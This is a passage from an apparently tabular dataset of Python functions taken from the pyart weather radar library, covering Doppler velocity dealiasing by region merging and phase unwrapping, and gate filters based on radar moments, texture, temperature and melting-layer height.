        add_value = vels_slice_means[reg] + np.round(nyq_vector[i]) * v_nyq_vel - svels_slice_means[reg]
        if np.isfinite(add_value):
            gradient_vector[i] = 2 * add_value * v_nyq_vel
        vels_without_cur = np.delete(vels_slice_means, reg)
        diffs = np.square(vels_slice_means[reg] - vels_without_cur)
        if len(diffs) > 0:
            the_min = np.argmin(diffs)
        else:
            the_min = 0
        if the_min < v_nyq_vel:
            gradient_vector[i] = 0
        i = i + 1
    return gradient_vector"
ARM-DOE/pyart,__init__,"def __init__(self, region_sizes):
    """"""initalize.""""""
    nregions = len(region_sizes) + 1
    self.node_size = np.zeros(nregions, dtype='int32')
    self.node_size[1:] = region_sizes[:]
    self.regions_in_node = np.zeros(nregions, dtype='object')
    for i in range(nregions):
        self.regions_in_node[i] = [i]
    self.unwrap_number = np.zeros(nregions, dtype='int32')"
ARM-DOE/pyart,merge_nodes,"def merge_nodes(self, node_a, node_b):
    """"""Merge node b into node a.""""""
    regions_to_merge = self.regions_in_node[node_b]
    self.regions_in_node[node_a].extend(regions_to_merge)
    self.regions_in_node[node_b] = []
    self.node_size[node_a] += self.node_size[node_b]
    self.node_size[node_b] = 0
    return"
ARM-DOE/pyart,unwrap_node,"def unwrap_node(self, node, nwrap):
    """"""Unwrap all gates contained a node.""""""
    if nwrap == 0:
        return
    regions_to_unwrap = self.regions_in_node[node]
    self.unwrap_number[regions_to_unwrap] += nwrap
    return"
ARM-DOE/pyart,get_node_size,"def get_node_size(self, node):
    """"""Return the number of gates in a node.""""""
    return self.node_size[node]"
ARM-DOE/pyart,__init__,"def __init__(self, indices, edge_count, velocities, nyquist_interval, nnodes):
    """"""initialize""""""
    nedges = int(len(indices[0]) / 2)
    self.node_alpha = np.zeros(nedges, dtype=np.int32)
    self.node_beta = np.zeros(nedges, dtype=np.int32)
    self.sum_diff = np.zeros(nedges, dtype=np.float32)
    self.weight = np.zeros(nedges, dtype=np.int32)
    self._common_finder = np.zeros(nnodes, dtype=np.bool_)
    self._common_index = np.zeros(nnodes, dtype=np.int32)
    self._last_base_node = -1
    self.edges_in_node = np.zeros(nnodes, dtype='object')
    for i in range(nnodes):
        self.edges_in_node[i] = []
    edge = 0
    (idx1, idx2) = indices
    (vel1, vel2) = velocities
    for (i, j, count, vel, nvel) in zip(idx1, idx2, edge_count, vel1, vel2):
        if i < j:
            continue
        self.node_alpha[edge] = i
        self.node_beta[edge] = j
        self.sum_diff[edge] = (vel - nvel) / nyquist_interval
        self.weight[edge] = count
        self.edges_in_node[i].append(edge)
        self.edges_in_node[j].append(edge)
        edge += 1
    self.priority_queue = []"
ARM-DOE/pyart,merge_nodes,"def merge_nodes(self, base_node, merge_node, foo_edge):
    """"""Merge nodes.""""""
    self.weight[foo_edge] = -999
    self.edges_in_node[merge_node].remove(foo_edge)
    self.edges_in_node[base_node].remove(foo_edge)
    self._common_finder[merge_node] = False
    edges_in_merge = list(self.edges_in_node[merge_node])
    if self._last_base_node != base_node:
        self._common_finder[:] = False
        edges_in_base = list(self.edges_in_node[base_node])
        for edge_num in edges_in_base:
            if self.node_beta[edge_num] == base_node:
                self._reverse_edge_direction(edge_num)
            assert self.node_alpha[edge_num] == base_node
            neighbor = self.node_beta[edge_num]
            self._common_finder[neighbor] = True
            self._common_index[neighbor] = edge_num
    for edge_num in edges_in_merge:
        if self.node_beta[edge_num] == merge_node:
            self._reverse_edge_direction(edge_num)
        assert self.node_alpha[edge_num] == merge_node
        self.node_alpha[edge_num] = base_node
        neighbor = self.node_beta[edge_num]
        if self._common_finder[neighbor]:
            base_edge_num = self._common_index[neighbor]
            self._combine_edges(base_edge_num, edge_num, merge_node, neighbor)
        else:
            self._common_finder[neighbor] = True
            self._common_index[neighbor] = edge_num
    edges = self.edges_in_node[merge_node]
    self.edges_in_node[base_node].extend(edges)
    self.edges_in_node[merge_node] = []
    self._last_base_node = int(base_node)
    return"
ARM-DOE/pyart,_combine_edges,"def _combine_edges(self, base_edge, merge_edge, merge_node, neighbor_node):
    """"""Combine edges into a single edge.""""""
    self.weight[base_edge] += self.weight[merge_edge]
    self.weight[merge_edge] = -999.0
    self.sum_diff[base_edge] += self.sum_diff[merge_edge]
    self.edges_in_node[merge_node].remove(merge_edge)
    self.edges_in_node[neighbor_node].remove(merge_edge)"
ARM-DOE/pyart,_reverse_edge_direction,"def _reverse_edge_direction(self, edge):
    """"""Reverse an edges direction, change alpha and beta.""""""
    old_alpha = int(self.node_alpha[edge])
    old_beta = int(self.node_beta[edge])
    self.node_alpha[edge] = old_beta
    self.node_beta[edge] = old_alpha
    self.sum_diff[edge] = -1.0 * self.sum_diff[edge]
    return"
ARM-DOE/pyart,unwrap_node,"def unwrap_node(self, node, nwrap):
    """"""Unwrap a node.""""""
    if nwrap == 0:
        return
    for edge in self.edges_in_node[node]:
        weight = self.weight[edge]
        if node == self.node_alpha[edge]:
            self.sum_diff[edge] += weight * nwrap
        else:
            assert self.node_beta[edge] == node
            self.sum_diff[edge] += -weight * nwrap
    return"
ARM-DOE/pyart,pop_edge,"def pop_edge(self):
    """"""Pop edge with largest weight. Return node numbers and diff.""""""
    edge_num = np.argmax(self.weight)
    node1 = self.node_alpha[edge_num]
    node2 = self.node_beta[edge_num]
    weight = self.weight[edge_num]
    diff = self.sum_diff[edge_num] / float(weight)
    if weight < 0:
        return (True, None)
    return (False, (node1, node2, weight, diff, edge_num))"
ARM-DOE/pyart,cost_function,"def cost_function(x):
    return _cost_function(x, scorr_means, sref_means, nyquist_interval, nfeatures_corr)"
ARM-DOE/pyart,gradient,"def gradient(x):
    return _gradient(x, scorr_means, sref_means, nyquist_interval, nfeatures_corr)"
ARM-DOE/pyart,dealias_unwrap_phase,"def dealias_unwrap_phase(radar, unwrap_unit='sweep', nyquist_vel=None, check_nyquist_uniform=True, gatefilter=False, rays_wrap_around=None, keep_original=False, set_limits=True, vel_field=None, corr_vel_field=None, skip_checks=False, **kwargs):
    """"""
    Dealias Doppler velocities using multi-dimensional phase unwrapping
    [1]_ and [2]_.

    Parameters
    ----------
    radar : Radar
        Radar object containing Doppler velocities to dealias.
    unwrap_unit : {'ray', 'sweep', 'volume'}, optional
        Unit to unwrap independently. 'ray' will unwrap each ray
        individually, 'sweep' each sweep, and 'volume' will unwrap the entire
        volume in a single pass. 'sweep', the default, often gives superior
        results when the lower sweeps of the radar volume are contaminated by
        clutter. 'ray' does not use the gatefilter parameter and rays where
        gates ared masked will result in poor dealiasing for that ray.
    nyquist_velocity : array like or float, optional
        Nyquist velocity in unit identical to those stored in the radar's
        velocity field, either for each sweep or a single value which will be
        used for all sweeps. None will attempt to determine this value from
        the Radar object. The Nyquist velocity of the first sweep is used
        for all dealiasing unless the unwrap_unit is 'sweep' when the
        velocities of each sweep are used.
    check_nyquist_uniform : bool, optional
        True to check if the Nyquist velocities are uniform for all rays
        within a sweep, False will skip this check. This parameter is ignored
        when the nyquist_velocity parameter is not None.
    gatefilter : GateFilter, None or False, optional.
        A GateFilter instance which specified which gates should be
        ignored when performing de-aliasing. A value of None created this
        filter from the radar moments using any additional arguments by
        passing them to :py:func:`moment_based_gate_filter`. False, the
        default, disables filtering including all gates in the dealiasing.
    rays_wrap_around : bool or None, optional
        True when the rays at the beginning of the sweep and end of the sweep
        should be interpreted as connected when de-aliasing (PPI scans).
        False if they edges should not be interpreted as connected (other scan
        types). None will determine the correct value from the radar
        scan type.
    keep_original : bool, optional
        True to retain the original Doppler velocity values at gates
        where the dealiasing procedure fails or was not applied. False
        does not replacement and these gates will be masked in the corrected
        velocity field.
    set_limits : bool, optional
        True to set valid_min and valid_max elements in the returned
        dictionary. False will not set these dictionary elements.
    vel_field : str, optional
        Field in radar to use as the Doppler velocities during dealiasing.
        None will use the default field name from the Py-ART configuration
        file.
    corr_vel_field : str, optional
        Name to use for the dealiased Doppler velocity field metadata.  None
        will use the default field name from the Py-ART configuration file.
    skip_checks : bool
        True to skip checks verifing that an appropiate unwrap_unit is
        selected, False retains these checked. Setting this parameter to True
        is not recommended and is only offered as an option for extreme cases.

    Returns
    -------
    corr_vel : dict
        Field dictionary containing dealiased Doppler velocities.  Dealiased
        array is stored under the 'data' key.

    References
    ----------
    .. [1] Miguel Arevallilo Herraez, David R. Burton, Michael J. Lalor,
        and Munther A. Gdeisat, ""Fast two-dimensional phase-unwrapping
        algorithm based on sorting by reliability following a noncontinuous
        path"", Journal Applied Optics, Vol. 41, No. 35 (2002) 7437,
    .. [2] Abdul-Rahman, H., Gdeisat, M., Burton, D., & Lalor, M., ""Fast
        three-dimensional phase-unwrapping algorithm based on sorting by
        reliability following a non-continuous path. In W. Osten,
        C. Gorecki, & E. L. Novak (Eds.), Optical Metrology (2005) 32--40,
        International Society for Optics and Photonics.

    """"""
    (vel_field, corr_vel_field) = _parse_fields(vel_field, corr_vel_field)
    gatefilter = _parse_gatefilter(gatefilter, radar, **kwargs)
    rays_wrap_around = _parse_rays_wrap_around(rays_wrap_around, radar)
    nyquist_vel = _parse_nyquist_vel(nyquist_vel, radar, check_nyquist_uniform)
    if not skip_checks:
        _verify_unwrap_unit(radar, unwrap_unit)
    gatefilter.exclude_masked(vel_field)
    gatefilter.exclude_invalid(vel_field)
    gfilter = gatefilter.gate_excluded
    raw_vdata = radar.fields[vel_field]['data']
    vdata = raw_vdata.view(np.ndarray)
    if unwrap_unit == 'ray':
        data = _dealias_unwrap_1d(vdata, nyquist_vel)
    elif unwrap_unit == 'sweep':
        data = _dealias_unwrap_2d(radar, vdata, nyquist_vel, gfilter, rays_wrap_around)
    elif unwrap_unit == 'volume':
        data = _dealias_unwrap_3d(radar, vdata, nyquist_vel, gfilter, rays_wrap_around)
    else:
        message = ""Unknown `unwrap_unit` parameter, must be one of 'ray', 'sweep', or 'volume'.""
        raise ValueError(message)
    fill_value = radar.fields[vel_field].get('_FillValue', get_fillvalue())
    if np.any(gfilter):
        data = np.ma.array(data, mask=gfilter, fill_value=fill_value)
    if keep_original:
        data[gfilter] = raw_vdata[gfilter]
    corr_vel = get_metadata(corr_vel_field)
    corr_vel['data'] = data
    corr_vel['_FillValue'] = fill_value
    if set_limits:
        _set_limits(data, nyquist_vel, corr_vel)
    return corr_vel"
ARM-DOE/pyart,_dealias_unwrap_3d,"def _dealias_unwrap_3d(radar, vdata, nyquist_vel, gfilter, rays_wrap_around):
    """"""Dealias using 3D phase unwrapping (full volume at once).""""""
    nyquist_vel = nyquist_vel[0]
    shape = (radar.nsweeps, -1, radar.ngates)
    scaled_cube = (np.pi * vdata / nyquist_vel).reshape(shape)
    filter_cube = gfilter.reshape(shape)
    wrapped = np.require(scaled_cube, np.float64, ['C'])
    mask = np.require(filter_cube, np.uint8, ['C'])
    unwrapped = np.empty_like(wrapped, dtype=np.float64, order='C')
    unwrap_3d(wrapped, mask, unwrapped, [False, rays_wrap_around, False])
    unwrapped_cube = unwrapped * nyquist_vel / np.pi
    unwrapped_volume = unwrapped_cube.reshape(-1, radar.ngates)
    unwrapped_volume = unwrapped_volume.astype(vdata.dtype)
    return unwrapped_volume"
ARM-DOE/pyart,_dealias_unwrap_1d,"def _dealias_unwrap_1d(vdata, nyquist_vel):
    """"""Dealias using 1D phase unwrapping (ray-by-ray).""""""
    nyquist_vel = nyquist_vel[0]
    data = np.empty_like(vdata)
    for (i, ray) in enumerate(vdata):
        scaled_ray = ray * np.pi / nyquist_vel
        wrapped = np.require(scaled_ray, np.float64, ['C'])
        unwrapped = np.empty_like(wrapped, dtype=np.float64, order='C')
        unwrap_1d(wrapped, unwrapped)
        data[i] = unwrapped * nyquist_vel / np.pi
    return data"
ARM-DOE/pyart,_dealias_unwrap_2d,"def _dealias_unwrap_2d(radar, vdata, nyquist_vel, gfilter, rays_wrap_around):
    """"""Dealias using 2D phase unwrapping (sweep-by-sweep).""""""
    data = np.zeros_like(vdata)
    for (nsweep, sweep_slice) in enumerate(radar.iter_slice()):
        sweep_nyquist_vel = nyquist_vel[nsweep]
        scaled_sweep = vdata[sweep_slice] * np.pi / sweep_nyquist_vel
        sweep_mask = gfilter[sweep_slice]
        wrapped = np.require(scaled_sweep, np.float64, ['C'])
        mask = np.require(sweep_mask, np.uint8, ['C'])
        unwrapped = np.empty_like(wrapped, dtype=np.float64, order='C')
        unwrap_2d(wrapped, mask, unwrapped, [rays_wrap_around, False])
        data[sweep_slice, :] = unwrapped * sweep_nyquist_vel / np.pi
    return data"
ARM-DOE/pyart,_verify_unwrap_unit,"def _verify_unwrap_unit(radar, unwrap_unit):
    """"""
    Verify that the radar supports the requested unwrap unit

    raises a ValueError if the unwrap_unit is not supported.
    """"""
    if unwrap_unit == 'sweep' or unwrap_unit == 'volume':
        if _is_radar_sequential(radar) is False:
            mess = ""rays are not sequentially ordered, must use 'ray' unwrap_unit.""
            raise ValueError(mess)
    if unwrap_unit == 'volume':
        if _is_radar_cubic(radar) is False:
            mess = ""Non-cubic radar volume, 'volume' unwrap_unit invalid. ""
            raise ValueError(mess)
        if _is_radar_sweep_aligned(radar) is False:
            mess = ""Angle in sequential sweeps in radar volumes are not aligned, 'volume unwrap_unit invalid.""
            raise ValueError(mess)"
ARM-DOE/pyart,_is_radar_cubic,"def _is_radar_cubic(radar):
    """"""Test if a radar is cubic (sweeps have the same number of rays).""""""
    rays_per_sweep = radar.rays_per_sweep['data']
    return bool(np.all(rays_per_sweep == rays_per_sweep[0]))"
ARM-DOE/pyart,_is_radar_sweep_aligned,"def _is_radar_sweep_aligned(radar, diff=0.1):
    """"""
    Test that all sweeps in the radar sample nearly the same angles.

    Test that the maximum difference in sweep sampled angles is below
    `diff` degrees. The radar should first be tested to verify that is cubic
    before calling this function using the _is_radar_cubic function.

    """"""
    if radar.nsweeps == 1:
        return True
    if radar.scan_type == 'ppi':
        angles = radar.azimuth['data']
    elif radar.scan_type == 'rhi':
        angles = radar.elevation['data']
    else:
        raise ValueError('invalid scan_type: %s' % radar.scan_type)
    starts = radar.sweep_start_ray_index['data']
    ends = radar.sweep_end_ray_index['data']
    ref_angles = angles[starts[0]:ends[0] + 1]
    for (start, end) in zip(starts, ends):
        test_angles = angles[start:end + 1]
        if np.any(np.abs(test_angles - ref_angles) > diff):
            return False
    return True"
ARM-DOE/pyart,_is_radar_sequential,"def _is_radar_sequential(radar):
    """"""Test if all sweeps in radar are sequentially ordered.""""""
    for i in range(radar.nsweeps):
        if not _is_sweep_sequential(radar, i):
            return False
    return True"
ARM-DOE/pyart,_is_sweep_sequential,"def _is_sweep_sequential(radar, sweep_number):
    """"""Test if a specific sweep is sequentially ordered.""""""
    start = radar.sweep_start_ray_index['data'][sweep_number]
    end = radar.sweep_end_ray_index['data'][sweep_number]
    if radar.scan_type == 'ppi':
        angles = radar.azimuth['data'][start:end + 1]
    elif radar.scan_type == 'rhi':
        angles = radar.elevation['data'][start:end + 1]
    elif radar.scan_type == 'vpt':
        angles = radar.time['data']
    else:
        raise ValueError('invalid scan_type: %s' % radar.scan_type)
    rolled_angles = np.roll(angles, -np.argmin(angles))
    return np.all(np.diff(rolled_angles) >= 0)"
ARM-DOE/pyart,moment_based_gate_filter,"def moment_based_gate_filter(radar, ncp_field=None, rhv_field=None, refl_field=None, min_ncp=0.5, min_rhv=None, min_refl=-20.0, max_refl=100.0):
    """"""
    Create a filter which removes undesired gates based on moments.

    Creates a gate filter in which the following gates are excluded:

    * Gates where the instrument is transitioning between sweeps.
    * Gates where the reflectivity is outside the interval min_refl, max_refl.
    * Gates where the normalized coherent power is below min_ncp.
    * Gates where the cross correlation ratio is below min_rhi. Using the
      default parameter this filtering is disabled.
    * Gates where any of the above three fields are masked or contain
      invalid values (NaNs or infs).
    * If any of these three fields do not exist in the radar that fields filter
      criteria is not applied.

    Parameters
    ----------
    radar : Radar
        Radar object from which the gate filter will be built.
    refl_field, ncp_field, rhv_field : str
        Names of the radar fields which contain the reflectivity, normalized
        coherent power (signal quality index) and cross correlation ratio
        (RhoHV) from which the gate filter will be created using the above
        criteria. A value of None for any of these parameters will use the
        default field name as defined in the Py-ART configuration file.
    min_ncp, min_rhv : float
        Minimum values for the normalized coherence power and cross
        correlation ratio. Gates in these fields below these limits as well as
        gates which are masked or contain invalid values will be excluded and
        not used in calculation which use the filter. A value of None will
        disable filtering based upon the given field including removing
        masked or gates with an invalid value. To disable the thresholding
        but retain the masked and invalid filter set the parameter to a value
        below the lowest value in the field.
    min_refl, max_refl : float
        Minimum and maximum values for the reflectivity. Gates outside
        of this interval as well as gates which are masked or contain invalid
        values will be excluded and not used in calculation which use this
        filter. A value or None for one of these parameters will disable the
        minimum or maximum filtering but retain the other. A value of None
        for both of these values will disable all filtering based upon the
        reflectivity including removing masked or gates with an invalid value.
        To disable the interval filtering but retain the masked and invalid
        filter set the parameters to values above and below the lowest and
        greatest values in the reflectivity field.

    Returns
    -------
    gatefilter : :py:class:`GateFilter`
        A gate filter based upon the described criteria. This can be
        used as a gatefilter parameter to various functions in pyart.correct.

    """"""
    if refl_field is None:
        refl_field = get_field_name('reflectivity')
    if ncp_field is None:
        ncp_field = get_field_name('normalized_coherent_power')
    if rhv_field is None:
        rhv_field = get_field_name('cross_correlation_ratio')
    gatefilter = GateFilter(radar)
    gatefilter.exclude_transition()
    if min_ncp is not None and ncp_field in radar.fields:
        gatefilter.exclude_below(ncp_field, min_ncp)
        gatefilter.exclude_masked(ncp_field)
        gatefilter.exclude_invalid(ncp_field)
    if min_rhv is not None and rhv_field in radar.fields:
        gatefilter.exclude_below(rhv_field, min_rhv)
        gatefilter.exclude_masked(rhv_field)
        gatefilter.exclude_invalid(rhv_field)
    if refl_field in radar.fields:
        if min_refl is not None:
            gatefilter.exclude_below(refl_field, min_refl)
            gatefilter.exclude_masked(refl_field)
            gatefilter.exclude_invalid(refl_field)
        if max_refl is not None:
            gatefilter.exclude_above(refl_field, max_refl)
            gatefilter.exclude_masked(refl_field)
            gatefilter.exclude_invalid(refl_field)
    return gatefilter"
ARM-DOE/pyart,moment_and_texture_based_gate_filter,"def moment_and_texture_based_gate_filter(radar, zdr_field=None, rhv_field=None, phi_field=None, refl_field=None, textzdr_field=None, textrhv_field=None, textphi_field=None, textrefl_field=None, wind_size=7, max_textphi=20.0, max_textrhv=0.3, max_textzdr=2.85, max_textrefl=8.0, min_rhv=0.6):
    """"""
    Create a filter which removes undesired gates based on texture of moments.

    Creates a gate filter in which the following gates are excluded:

    * Gates where the instrument is transitioning between sweeps.
    * Gates where RhoHV is below min_rhv
    * Gates where the PhiDP texture is above max_textphi.
    * Gates where the RhoHV texture is above max_textrhv.
    * Gates where the ZDR texture is above max_textzdr
    * Gates where the reflectivity texture is above max_textrefl
    * If any of the thresholds is not set or the field (RhoHV, ZDR, PhiDP,
      reflectivity) do not exist in the radar the filter is not applied.

    Parameters
    ----------
    radar : Radar
        Radar object from which the gate filter will be built.
    zdr_field, rhv_field, phi_field, refl_field : str
        Names of the radar fields which contain the differential reflectivity,
        cross correlation ratio, differential phase and reflectivity from
        which the textures will be computed. A value of None for any of these
        parameters will use the default field name as defined in the Py-ART
        configuration file.
    textzdr_field, textrhv_field, textphi_field, textrefl_field : str
        Names of the radar fields given to the texture of the
        differential reflectivity, texture of the cross correlation ratio,
        texture of differential phase and texture of reflectivity. A value
        of None for any of these parameters will use the default field name
        as defined in the Py-ART configuration file.
    wind_size : int
        Size of the moving window used to compute the ray texture.
    max_textphi, max_textrhv, max_textzdr, max_textrefl : float
        Maximum value for the texture of the differential phase, texture of
        RhoHV, texture of Zdr and texture of reflectivity. Gates in these
        fields above these limits as well as gates which are masked or contain
        invalid values will be excluded and not used in calculation which use
        the filter. A value of None will disable filtering based upon the
        given field including removing masked or gates with an invalid value.
        To disable the thresholding but retain the masked and invalid filter
        set the parameter to a value above the highest value in the field.
    min_rhv : float
        Minimum value for the RhoHV. Gates below this limits as well as gates
        which are masked or contain invalid values will be excluded and not
        used in calculation which use the filter. A value of None will disable
        filtering based upon the given field including removing masked or
        gates with an invalid value. To disable the thresholding but retain
        the masked and invalid filter set the parameter to a value below the
        lowest value in the field.

    Returns
    -------
    gatefilter : :py:class:`GateFilter`
        A gate filter based upon the described criteria. This can be
        used as a gatefilter parameter to various functions in pyart.correct.

    """"""
    if refl_field is None:
        refl_field = get_field_name('reflectivity')
    if zdr_field is None:
        zdr_field = get_field_name('differential_reflectivity')
    if rhv_field is None:
        rhv_field = get_field_name('cross_correlation_ratio')
    if phi_field is None:
        phi_field = get_field_name('uncorrected_differential_phase')
    if textrefl_field is None:
        textrefl_field = get_field_name('reflectivity_texture')
    if textzdr_field is None:
        textzdr_field = get_field_name('differential_reflectivity_texture')
    if textrhv_field is None:
        textrhv_field = get_field_name('cross_correlation_ratio_texture')
    if textphi_field is None:
        textphi_field = get_field_name('differential_phase_texture')
    radar_aux = deepcopy(radar)
    if max_textphi is not None and phi_field in radar_aux.fields:
        textphi = texture_along_ray(radar_aux, phi_field, wind_size=wind_size)
        tphi = get_metadata(textphi_field)
        tphi['data'] = textphi
        radar_aux.add_field(textphi_field, tphi)
    if max_textrhv is not None and rhv_field in radar_aux.fields:
        textrho = texture_along_ray(radar_aux, rhv_field, wind_size=wind_size)
        trhv = get_metadata(textrhv_field)
        trhv['data'] = textrho
        radar_aux.add_field(textrhv_field, trhv)
    if max_textzdr is not None and zdr_field in radar_aux.fields:
        textzdr = texture_along_ray(radar_aux, zdr_field, wind_size=wind_size)
        tzdr = get_metadata(textzdr_field)
        tzdr['data'] = textzdr
        radar_aux.add_field(textzdr_field, tzdr)
    if max_textrefl is not None and refl_field in radar_aux.fields:
        textrefl = texture_along_ray(radar_aux, refl_field, wind_size=wind_size)
        trefl = get_metadata(textrefl_field)
        trefl['data'] = textrefl
        radar_aux.add_field(textrefl_field, trefl)
    gatefilter = GateFilter(radar_aux)
    gatefilter.exclude_transition()
    if min_rhv is not None and rhv_field in radar_aux.fields:
        gatefilter.exclude_below(rhv_field, min_rhv)
        gatefilter.exclude_masked(rhv_field)
        gatefilter.exclude_invalid(rhv_field)
    if max_textphi is not None and textphi_field in radar_aux.fields:
        gatefilter.exclude_above(textphi_field, max_textphi)
        gatefilter.exclude_masked(textphi_field)
        gatefilter.exclude_invalid(textphi_field)
    if max_textrhv is not None and textrhv_field in radar_aux.fields:
        gatefilter.exclude_above(textrhv_field, max_textrhv)
        gatefilter.exclude_masked(textrhv_field)
        gatefilter.exclude_invalid(textrhv_field)
    if max_textzdr is not None and textzdr_field in radar_aux.fields:
        gatefilter.exclude_above(textzdr_field, max_textzdr)
        gatefilter.exclude_masked(textzdr_field)
        gatefilter.exclude_invalid(textzdr_field)
    if max_textrefl is not None and textrefl_field in radar_aux.fields:
        gatefilter.exclude_above(textrefl_field, max_textrefl)
        gatefilter.exclude_masked(textrefl_field)
        gatefilter.exclude_invalid(textrefl_field)
    return gatefilter"
ARM-DOE/pyart,temp_based_gate_filter,"def temp_based_gate_filter(radar, temp_field=None, min_temp=0.0, thickness=400.0, beamwidth=None):
    """"""
    Create a filter which removes undesired gates based on temperature. Used
    primarily to filter out the melting layer and gates above it.

    Parameters
    ----------
    radar : Radar
        Radar object from which the gate filter will be built.
    temp_field : str
        Name of the radar field which contains the temperature.
        A value of None for will use the default field name as defined in
        the Py-ART configuration file.
    min_temp : float
        Minimum value for the temperature in degrees. Gates below this limits
        as well as gates which are masked or contain invalid values will be
        excluded and not used in calculation which use the filter. A value of
        None will disable filtering based upon the field including removing
        masked or gates with an invalid value. To disable the thresholding but
        retain the masked and invalid filter set the parameter to a value
        below the lowest value in the field.
    thickness : float
        The estimated thickness of the melting layer in m.
    beamwidth : float
        The radar antenna 3 dB beamwidth [deg].

    Returns
    -------
    gatefilter : :py:class:`GateFilter`
        A gate filter based upon the described criteria. This can be
        used as a gatefilter parameter to various functions in pyart.correct.

    """"""
    if temp_field is None:
        temp_field = get_field_name('temperature')
    radar_aux = deepcopy(radar)
    gatefilter = GateFilter(radar_aux)
    if min_temp is not None and temp_field in radar_aux.fields:
        gatefilter.exclude_below(temp_field, min_temp)
        gatefilter.exclude_masked(temp_field)
        gatefilter.exclude_invalid(temp_field)
    deltar = radar.range['data'][1] - radar.range['data'][0]
    if beamwidth is not None:
        beam_rad = beamwidth * np.pi / 180.0
    if thickness is not None:
        temp = radar_aux.fields[temp_field]
        temp['data'] = np.ma.masked_where(gatefilter.gate_excluded == 1, temp['data'])
        for ray in range(radar_aux.nrays):
            gate_h_ray = radar_aux.gate_altitude['data'][ray, :]
            ind_r = np.where(gatefilter.gate_excluded[ray, :] == 1)[0]
            if ind_r.size > 0:
                ind_r = ind_r[0]
                if beamwidth is None:
                    hmax = gate_h_ray[ind_r] - thickness
                else:
                    if ind_r < radar_aux.ngates - 2:
                        hmax = (gate_h_ray[ind_r] + gate_h_ray[ind_r + 1]) / 2.0 - thickness
                    else:
                        hmax = gate_h_ray[ind_r] - thickness
                    beam_radius = (radar.range['data'][ind_r] + deltar / 2.0) * beam_rad / 2.0
                    delta_h = beam_radius * np.cos(radar.elevation['data'][ray] * np.pi / 180.0)
                    hmax -= delta_h
                ind_hmax = np.where(radar_aux.gate_altitude['data'][ray, :] > hmax)[0]
                if ind_hmax.size > 0:
                    ind_hmax = ind_hmax[0]
                    temp['data'][ray, ind_hmax:] = np.ma.masked
        radar_aux.add_field(temp_field, temp, replace_existing=True)
        gatefilter = GateFilter(radar_aux)
        gatefilter.exclude_masked(temp_field)
    return gatefilter"
ARM-DOE/pyart,iso0_based_gate_filter,"def iso0_based_gate_filter(radar, iso0_field=None, max_h_iso0=0.0, thickness=400.0, beamwidth=None):
    """"""
    Create a filter which removes undesired gates based height over the iso0.
    Used primarily to filter out the melting layer and gates above it.

    Parameters
    ----------
    radar : Radar
        Radar object from which the gate filter will be built.
    iso0_field : str
        Name of the radar field which contains the height relative to the
        iso0. A value of None for will use the default field name as defined
        in the Py-ART configuration file.
    max_h_iso0 : float
        Maximum height relative to the iso0 in m. Gates below this limits
        as well as gates which are masked or contain invalid values will be
        excluded and not used in calculation which use the filter. A value of
        None will disable filtering based upon the field including removing
        masked or gates with an invalid value. To disable the thresholding but
        retain the masked and invalid filter set the parameter to a value
        below the lowest value in the field.
    thickness : float
        The estimated thickness of the melting layer in m.
    beamwidth : float
        The radar antenna 3 dB beamwidth [deg].

    Returns
    -------
    gatefilter : :py:class:`GateFilter`
        A gate filter based upon the described criteria. This can be
        used as a gatefilter parameter to various functions in pyart.correct.

    """"""
    if iso0_field is None:
        iso0_field = get_field_name('height_over_iso0')
    radar_aux = deepcopy(radar)
    gatefilter = GateFilter(radar_aux)
    if max_h_iso0 is not None and iso0_field in radar_aux.fields:
        gatefilter.exclude_above(iso0_field, max_h_iso0)
        gatefilter.exclude_masked(iso0_field)
        gatefilter.exclude_invalid(iso0_field)
    deltar = radar.range['data'][1] - radar.range['data'][0]
    if beamwidth is not None:
        beam_rad = beamwidth * np.pi / 180.0
    if thickness is not None:
        iso0 = radar_aux.fields[iso0_field]
        iso0['data'] = np.ma.masked_where(gatefilter.gate_excluded == 1, iso0['data'])
        for ray in range(radar_aux.nrays):
            gate_h_ray = radar_aux.gate_altitude['data'][ray, :]
            ind_r = np.where(gatefilter.gate_excluded[ray, :] == 1)[0]
            if ind_r.size > 0:
                ind_r = ind_r[0]
                if beamwidth is None:
                    hmax = gate_h_ray[ind_r] - thickness
                else:
                    if ind_r < radar_aux.ngates - 2:
                        hmax = (gate_h_ray[ind_r] + gate_h_ray[ind_r + 1]) / 2.0 - thickness
                    else:
                        hmax = gate_h_ray[ind_r] - thickness
                    beam_radius = (radar.range['data'][ind_r] + deltar / 2.0) * beam_rad / 2.0
                    delta_h = beam_radius * np.cos(radar.elevation['data'][ray] * np.pi / 180.0)
                    hmax -= delta_h
                ind_hmax = np.where(radar_aux.gate_altitude['data'][ray, :] > hmax)[0]
                if ind_hmax.size > 0:
                    ind_hmax = ind_hmax[0]
                    iso0['data'][ray, ind_hmax:] = np.ma.masked
        radar_aux.add_field(iso0_field, iso0, replace_existing=True)
        gatefilter = GateFilter(radar_aux)
        gatefilter.exclude_masked(iso0_field)
    return gatefilter"
ARM-DOE/pyart,__init__,"def __init__(self, radar, exclude_based=True):
    """"""initialize""""""
    self._radar = radar
    shape = (radar.nrays, radar.ngates)
    if exclude_based:
        self._gate_excluded = np.zeros(shape, dtype=np.bool_)
    else:
        self._gate_excluded = np.ones(shape, dtype=np.bool_)"
ARM-DOE/pyart,copy,"def copy(self):
    """"""Return a copy of the gatefilter.""""""
    a = GateFilter(self._radar)
    a._gate_excluded = self._gate_excluded.copy()
    return a"
ARM-DOE/pyart,gate_included,"@property
def gate_included(self):
    """"""
        Boolean array indicating if a gate should be included in a
        calculation. Elements marked True indicate the corresponding gate
        should be include. Those marked False should be excluded.
        This is read-only attribute, any changes to the array will NOT
        be reflected in gate_excluded and will be lost when the attribute is
        accessed again.
        """"""
    return ~self._gate_excluded.copy()"
ARM-DOE/pyart,gate_excluded,"@property
def gate_excluded(self):
    """"""
        Boolean array indicating if a gate should be excluded from a
        calculation. Elements marked True indicate the corresponding gate
        should be excluded. Those marked False should be included.
        This is read-only attribute, any changes to the array will NOT
        be reflected in gate_included and will be lost when the attribute is
        accessed again.
        """"""
    return self._gate_excluded.copy()"
ARM-DOE/pyart,_get_fdata,"def _get_fdata(self, field):
    """"""Check that the field exists and retrieve field data.""""""
    self._radar.check_field_exists(field)
    return self._radar.fields[field]['data']"
ARM-DOE/pyart,_merge,"def _merge(self, marked, op, exclude_masked):
    """"""Merge an array of marked gates with the exclude array.""""""
    if exclude_masked not in [True, False]:
        raise ValueError(""exclude_masked must be 'True' or 'False'"")
    marked = np.ma.filled(marked, exclude_masked)
    if op == 'or':
        self._gate_excluded = np.logical_or(self._gate_excluded, marked)
    elif op == 'and':
